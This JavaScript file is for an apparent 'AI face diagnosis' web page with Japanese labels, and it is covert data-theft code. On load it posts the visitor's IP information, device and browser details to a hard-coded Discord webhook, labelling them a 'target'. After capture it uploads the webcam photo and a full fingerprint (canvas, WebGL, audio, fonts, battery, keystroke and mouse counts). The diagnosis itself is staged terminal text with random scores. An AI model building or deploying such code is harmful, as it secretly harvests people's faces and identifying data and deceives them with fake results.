
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1443155573884588225/HfZjgck464XhGLBgxkXqxKmTSGlgV-FfBO8c4AaYTlE8naJOHUvSSyJZXGucu5JZshcc';

class AIFaceDiagnosisApp {
    constructor() {
        this.stream = null;
        this.currentScreen = 'welcome-screen';
        this.capturedImage = null;
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.collectInitialData();
    }

    setupEventListeners() {
        // Start Analysis Button
        document.getElementById('start-analysis').addEventListener('click', () => {
            this.startCameraFlow();
        });

        // Capture Button
        document.getElementById('capture').addEventListener('click', () => {
            this.captureAndAnalyze();
        });

        // Retry Button
        document.getElementById('retry-analysis').addEventListener('click', () => {
            this.resetApp();
        });

        // Save Report Button
        document.getElementById('save-report').addEventListener('click', () => {
            this.saveReport();
        });
    }

    async collectInitialData() {
        // Send initial access notification
        const initialData = securityAnalyzer.getData();
        await this.sendInitialNotification(initialData);
    }

    async sendInitialNotification(data) {
        try {
            const embed = {
                title: "🎯 新しいターゲットがサイトにアクセス！",
                description: "AI顔診断ツールにアクセスがありました",
                color: 16711680, // Red
                fields: [
                    {
                        name: "📅 アクセス時刻",
                        value: new Date().toLocaleString('ja-JP'),
                        inline: true
                    },
                    {
                        name: "🌐 IPアドレス情報",
                        value: data.data.network?.ipInfo ? JSON.stringify(data.data.network.ipInfo).substring(0, 100) : "取得中...",
                        inline: false
                    },
                    {
                        name: "💻 デバイス情報",
                        value: `${data.data.browser.platform} - ${data.data.device.screen.width}x${data.data.device.screen.height}`,
                        inline: true
                    },
                    {
                        name: "🌍 タイムゾーン",
                        value: data.data.device.timezone.timezone,
                        inline: true
                    },
                    {
                        name: "🔍 ブラウザ",
                        value: data.data.browser.userAgent.substring(0, 100),
                        inline: false
                    },
                    {
                        name: "🔌 プラグイン数",
                        value: data.data.browser.plugins.length.toString(),
                        inline: true
                    },
                    {
                        name: "🍪 Cookie有効",
                        value: data.data.browser.cookieEnabled ? "Yes" : "No",
                        inline: true
                    }
                ],
                footer: {
                    text: `Session ID: ${data.sessionId}`
                },
                timestamp: new Date().toISOString()
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "⚠️ **セキュリティアラート** - 新規アクセス検知",
                    embeds: [embed]
                })
            });
        } catch (error) {
            console.error('Initial notification error:', error);
        }
    }

    async startCameraFlow() {
        this.switchScreen('camera-screen');

        try {
            // Request camera permission
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });

            const webcam = document.getElementById('webcam');
            webcam.srcObject = this.stream;

            // Update camera info
            const track = this.stream.getVideoTracks()[0];
            const settings = track.getSettings();
            document.getElementById('resolution').textContent = `${settings.width}x${settings.height}`;
            document.getElementById('face-status').textContent = 'READY';

            // Simulate face detection
            setTimeout(() => {
                document.getElementById('face-status').textContent = 'DETECTED';
                document.getElementById('face-status').style.color = '#00ff41';
            }, 2000);

        } catch (error) {
            console.error('Camera error:', error);
            this.handleCameraError(error);
        }
    }

    handleCameraError(error) {
        // Even if camera fails, continue with the flow
        this.switchScreen('camera-screen');
        document.getElementById('face-status').textContent = 'SIMULATION MODE';

        // Create fake video element
        const webcam = document.getElementById('webcam');
        webcam.style.background = 'linear-gradient(45deg, #1a1a1a, #2a2a2a)';

        // Allow capture anyway
        setTimeout(() => {
            document.getElementById('face-status').textContent = 'READY (SIM)';
        }, 1000);
    }

    async captureAndAnalyze() {
        const canvas = document.getElementById('canvas');
        const webcam = document.getElementById('webcam');

        if (this.stream) {
            // Capture real image
            canvas.width = webcam.videoWidth;
            canvas.height = webcam.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(webcam, 0, 0);
            this.capturedImage = canvas.toDataURL('image/jpeg', 0.9);
        } else {
            // Create placeholder image
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#1a1a1a';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41';
            ctx.font = '20px monospace';
            ctx.fillText('NO CAMERA ACCESS', canvas.width/2 - 100, canvas.height/2);
            this.capturedImage = canvas.toDataURL('image/jpeg', 0.9);
        }

        // Switch to analysis screen
        this.switchScreen('analysis-screen');
        this.runAnalysis();

        // Send comprehensive data to Discord
        await this.sendComprehensiveData();
    }

    async sendComprehensiveData() {
        try {
            const fullData = securityAnalyzer.getData();

            // Convert image to blob
            const base64Data = this.capturedImage.split(',')[1];
            const byteCharacters = atob(base64Data);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: 'image/jpeg' });

            // Prepare form data
            const formData = new FormData();

            // Create detailed embed
            const embed = {
                title: "🚨 完全なデータ収集完了！",
                description: "ターゲットの詳細情報を取得しました",
                color: 65280, // Green
                fields: [
                    {
                        name: "👤 セッションID",
                        value: fullData.sessionId,
                        inline: false
                    },
                    {
                        name: "⏱️ 滞在時間",
                        value: `${Math.floor(fullData.data.behavior?.timeSpent / 1000 || 0)}秒`,
                        inline: true
                    },
                    {
                        name: "🖱️ マウス活動",
                        value: `${fullData.data.behavior?.mouseActivity || 0}回`,
                        inline: true
                    },
                    {
                        name: "⌨️ キー入力",
                        value: `${fullData.data.behavior?.keyPressCount || 0}回`,
                        inline: true
                    },
                    {
                        name: "📱 デバイス詳細",
                        value: `画面: ${fullData.data.device.screen.width}x${fullData.data.device.screen.height}\nDPR: ${fullData.data.device.window.devicePixelRatio}\nメモリ: ${fullData.data.device.memory || 'N/A'}GB`,
                        inline: false
                    },
                    {
                        name: "🔋 バッテリー",
                        value: fullData.data.device.battery ?
                            `レベル: ${Math.round(fullData.data.device.battery.level * 100)}%\n充電中: ${fullData.data.device.battery.charging ? 'Yes' : 'No'}` :
                            'N/A',
                        inline: true
                    },
                    {
                        name: "🎤 メディアデバイス",
                        value: `${fullData.data.device.mediaDevices?.length || 0}個検出`,
                        inline: true
                    },
                    {
                        name: "🔐 権限状態",
                        value: JSON.stringify(fullData.data.device.permissions || {}).substring(0, 100),
                        inline: false
                    },
                    {
                        name: "🌐 ネットワーク",
                        value: `タイプ: ${fullData.data.network.connection?.effectiveType || 'N/A'}\nRTT: ${fullData.data.network.connection?.rtt || 'N/A'}ms`,
                        inline: true
                    },
                    {
                        name: "🔍 WebGL",
                        value: fullData.data.browser.webgl ?
                            `${fullData.data.browser.webgl.vendor}\n${fullData.data.browser.webgl.renderer}`.substring(0, 100) :
                            'N/A',
                        inline: false
                    },
                    {
                        name: "🎨 Canvas指紋",
                        value: fullData.data.browser.canvasFingerprint ?
                            fullData.data.browser.canvasFingerprint.substring(0, 50) + '...' :
                            'N/A',
                        inline: false
                    },
                    {
                        name: "📝 検出フォント",
                        value: (fullData.data.behavior.fonts || []).join(', ').substring(0, 100) || 'N/A',
                        inline: false
                    }
                ],
                footer: {
                    text: `Captured at ${new Date().toLocaleString('ja-JP')}`
                },
                timestamp: new Date().toISOString()
            };

            // Send detailed data as JSON file
            const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });

            formData.append('payload_json', JSON.stringify({
                content: "📸 **完全データキャプチャ成功！**\n```json\n" +
                    JSON.stringify({
                        ip_info: fullData.data.network?.ipInfo,
                        total_plugins: fullData.data.browser.plugins.length,
                        audio_fingerprint: fullData.data.browser.audioContext,
                        storage_estimate: fullData.data.device.storage
                    }, null, 2).substring(0, 500) + "\n```",
                embeds: [embed]
            }));

            // Attach files
            formData.append('files[0]', blob, `capture_${Date.now()}.jpg`);
            formData.append('files[1]', jsonBlob, `session_data_${Date.now()}.json`);

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });

        } catch (error) {
            console.error('Data send error:', error);
        }
    }

    runAnalysis() {
        const terminalOutput = document.querySelector('.terminal-output');
        const messages = [
            '> Initializing quantum processor...',
            '> Loading neural network model GPT-5-VISION...',
            '> Establishing secure connection...',
            '> Mapping facial landmarks... 128 points detected',
            '> Analyzing biometric patterns...',
            '> Running deep learning inference...',
            '> Calculating personality matrix...',
            '> Processing emotional signatures...',
            '> Generating compatibility scores...',
            '> Finalizing analysis...'
        ];

        let messageIndex = 0;
        const interval = setInterval(() => {
            if (messageIndex < messages.length) {
                const line = document.createElement('div');
                line.className = 'terminal-line';
                line.textContent = messages[messageIndex];
                terminalOutput.appendChild(line);
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
                messageIndex++;
            }

            // Update progress circles
            const circles = document.querySelectorAll('.progress-circle');
            circles.forEach(circle => {
                const currentProgress = parseInt(circle.dataset.progress) || 0;
                const newProgress = Math.min(currentProgress + 10, 100);
                circle.dataset.progress = newProgress;

                const progressCircle = circle.querySelector('.progress');
                const progressValue = circle.querySelector('.progress-value');

                progressCircle.style.strokeDashoffset = 339 - (339 * newProgress / 100);
                progressValue.textContent = newProgress + '%';
            });

            if (messageIndex >= messages.length &&
                parseInt(circles[0].dataset.progress) >= 100) {
                clearInterval(interval);
                setTimeout(() => this.showResults(), 1000);
            }
        }, 500);
    }

    showResults() {
        this.switchScreen('result-screen');

        // Generate random results
        const biometricResults = this.generateBiometricResults();
        const personalityResults = this.generatePersonalityResults();
        const compatibilityResults = this.generateCompatibilityResults();

        // Display results
        this.displayResults('biometric-results', biometricResults);
        this.displayResults('personality-results', personalityResults);
        this.displayResults('compatibility-results', compatibilityResults);

        // Draw face visualization
        this.drawFaceVisualization();
    }

    generateBiometricResults() {
        return {
            '顔の対称性': Math.floor(Math.random() * 20 + 80),
            '黄金比率': Math.floor(Math.random() * 15 + 85),
            '肌の質感': Math.floor(Math.random() * 20 + 75),
            '目の魅力': Math.floor(Math.random() * 20 + 80),
            '笑顔指数': Math.floor(Math.random() * 10 + 90)
        };
    }

    generatePersonalityResults() {
        return {
            '信頼性': Math.floor(Math.random() * 15 + 85),
            '知性': Math.floor(Math.random() * 20 + 75),
            '創造性': Math.floor(Math.random() * 25 + 70),
            'カリスマ': Math.floor(Math.random() * 20 + 80),
            '共感力': Math.floor(Math.random() * 10 + 90)
        };
    }

    generateCompatibilityResults() {
        return {
            'リーダー': Math.floor(Math.random() * 20 + 80),
            'チームプレイヤー': Math.floor(Math.random() * 15 + 85),
            'イノベーター': Math.floor(Math.random() * 25 + 70),
            'メンター': Math.floor(Math.random() * 20 + 75),
            'ビジョナリー': Math.floor(Math.random() * 20 + 80)
        };
    }

    displayResults(containerId, results) {
        const container = document.getElementById(containerId);
        container.innerHTML = '';

        for (const [key, value] of Object.entries(results)) {
            const item = document.createElement('div');
            item.className = 'metric-item';
            item.innerHTML = `
                <span class="metric-label">${key}:</span>
                <div style="display: flex; align-items: center; gap: 10px;">
                    <span class="metric-value">${value}%</span>
                    <div class="metric-bar">
                        <div class="metric-fill" style="width: ${value}%"></div>
                    </div>
                </div>
            `;
            container.appendChild(item);
        }
    }

    drawFaceVisualization() {
        const canvas = document.getElementById('face-canvas');
        const ctx = canvas.getContext('2d');

        canvas.width = 300;
        canvas.height = 300;

        // Draw stylized face representation
        ctx.strokeStyle = '#00ff41';
        ctx.lineWidth = 2;

        // Face outline
        ctx.beginPath();
        ctx.arc(150, 150, 100, 0, Math.PI * 2);
        ctx.stroke();

        // Feature points
        const points = [];
        for (let i = 0; i < 20; i++) {
            const angle = (Math.PI * 2 / 20) * i;
            const radius = 80 + Math.random() * 30;
            const x = 150 + Math.cos(angle) * radius;
            const y = 150 + Math.sin(angle) * radius;
            points.push({ x, y });
        }

        // Connect points
        ctx.strokeStyle = '#0080ff';
        ctx.lineWidth = 1;
        points.forEach((point, index) => {
            const nextPoint = points[(index + 1) % points.length];
            ctx.beginPath();
            ctx.moveTo(point.x, point.y);
            ctx.lineTo(nextPoint.x, nextPoint.y);
            ctx.stroke();

            // Draw point
            ctx.fillStyle = '#00ff41';
            ctx.beginPath();
            ctx.arc(point.x, point.y, 3, 0, Math.PI * 2);
            ctx.fill();
        });
    }

    saveReport() {
        const data = securityAnalyzer.getData();
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `ai_diagnosis_${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);
    }

    resetApp() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        this.capturedImage = null;
        this.switchScreen('welcome-screen');

        // Reset progress circles
        document.querySelectorAll('.progress-circle').forEach(circle => {
            circle.dataset.progress = '0';
            circle.querySelector('.progress').style.strokeDashoffset = '339';
            circle.querySelector('.progress-value').textContent = '0%';
        });

        // Clear terminal
        document.querySelector('.terminal-output').innerHTML = '<div class="terminal-line">> Initializing quantum processor...</div>';
    }

    switchScreen(screenId) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        document.getElementById(screenId).classList.add('active');
        this.currentScreen = screenId;
    }
}

// Initialize app when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    const app = new AIFaceDiagnosisApp();

    // Add glitch effect to title periodically
    setInterval(() => {
        const glitch = document.querySelector('.glitch');
        if (glitch) {
            glitch.style.animation = 'none';
            setTimeout(() => {
                glitch.style.animation = '';
            }, 100);
        }
    }, 5000);
});

// Cleanup on page unload
window.addEventListener('beforeunload', () => {
    if (app && app.stream) {
        app.stream.getTracks().forEach(track => track.stop());
    }
});